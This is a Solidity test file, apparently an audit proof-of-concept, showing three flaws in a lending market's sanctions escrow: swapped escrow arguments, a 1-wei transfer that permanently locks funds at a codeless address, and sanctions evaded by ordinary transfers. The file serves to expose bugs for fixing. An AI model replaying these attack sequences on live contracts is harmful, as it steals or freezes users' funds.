// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Proof} from "proof/Proof.sol";
import {Market, Escrow, ISanctions} from "../src/Market.sol";

contract Sanctions is ISanctions {
    mapping(address => bool) public isSanctioned;
    function set(address a, bool v) external { isSanctioned[a] = v; }
}

// Test-only subclass: gives lenders market tokens. The snippet itself is unchanged.
contract TestMarket is Market {
    constructor(address b, ISanctions s) Market(b, s) {}
    function mint(address to, uint256 v) external { _mint(to, v); }
}

contract MarketProof is Proof {
    Sanctions sanctions;
    TestMarket market;
    address borrower = address(0xB022);
    address lender = address(0x1E4D);
    address fresh = address(0xF2E5);
    address anyone = address(0xA4A4);

    function setUp() public {
        sanctions = new Sanctions();
        market = new TestMarket(borrower, sanctions);
        market.mint(lender, 1_000e18);
    }

    // The address _escrow computes for the arguments it is called with: (lender, borrower).
    function predicted(address b, address a) internal view returns (address) {
        bytes memory code = abi.encodePacked(type(Escrow).creationCode, abi.encode(b, a, sanctions));
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(market), bytes32(0), keccak256(code))))));
    }

    // Issue 1: blockLender calls _escrow(lender, borrower) but _escrow takes (borrower, account),
    // so the escrow's account is the borrower and anyone can release the lender's tokens to it.
    function test_issue1_swappedArgumentsSendLenderFundsToBorrower() public {
        sanctions.set(lender, true);
        vm.prank(anyone);
        market.blockLender(lender);
        Escrow e = Escrow(predicted(lender, borrower));
        assertEq(market.balanceOf(address(e)), 1_000e18, "lender's tokens are in the escrow");
        assertEq(e.account(), borrower, "escrow account is the borrower");
        assertEq(e.borrower(), lender, "escrow borrower is the lender");
        vm.prank(anyone);
        e.release(); // the account (borrower) is not sanctioned
        assertEq(market.balanceOf(borrower), 1_000e18, "borrower received the sanctioned lender's tokens");
        assertEq(market.balanceOf(lender), 0, "lender has nothing");
    }

    // Issue 2: an address that holds ETH but no code has codehash keccak256(""), not zero.
    // Sending 1 wei to the predicted escrow address makes _escrow skip the deployment,
    // and the tokens are moved to an address with no code, where nothing can move them.
    function test_issue2_oneWeiAtEscrowAddressSkipsDeployment() public {
        sanctions.set(lender, true);
        address e = predicted(lender, borrower);
        vm.deal(anyone, 1);
        vm.prank(anyone);
        (bool ok,) = e.call{value: 1}("");
        assertTrue(ok, "1 wei sent");
        assertTrue(e.codehash == keccak256(""), "codehash is the empty-code hash, not zero");
        market.blockLender(lender);
        assertEq(e.code.length, 0, "no escrow was deployed");
        assertEq(market.balanceOf(e), 1_000e18, "tokens sit at a codeless address for good");
        sanctions.set(lender, false); // even once the lender is cleared,
        (bool called,) = e.call(abi.encodeCall(Escrow.release, ())); // a call to no code does nothing
        assertTrue(called, "low-level call to a codeless address succeeds");
        assertEq(market.balanceOf(e), 1_000e18, "and the tokens stay stuck");
        assertEq(market.balanceOf(lender), 0, "lender never gets them back");
    }

    function test_issue2_control_untouchedAddressDeploys() public {
        sanctions.set(lender, true);
        address e = predicted(lender, borrower);
        assertTrue(e.codehash == bytes32(0), "fresh address: codehash zero");
        market.blockLender(lender);
        assertGt(e.code.length, 0, "escrow deployed");
    }

    // Issue 3: market tokens move with plain ERC20 transfers that never consult the oracle,
    // so a lender moves the balance to a fresh address and the block reaches nothing.
    function test_issue3_sanctionedLenderMovesTokensFirst() public {
        sanctions.set(lender, true);
        vm.prank(lender);
        market.transfer(fresh, 1_000e18); // sanctioned, and still free to transfer
        market.blockLender(lender);
        assertEq(market.balanceOf(predicted(lender, borrower)), 0, "escrow got nothing");
        assertEq(market.balanceOf(fresh), 1_000e18, "the balance escaped to a fresh address");
        vm.prank(fresh);
        market.transfer(anyone, 1); // and keeps moving
        assertEq(market.balanceOf(anyone), 1, "usable as before");
    }
}
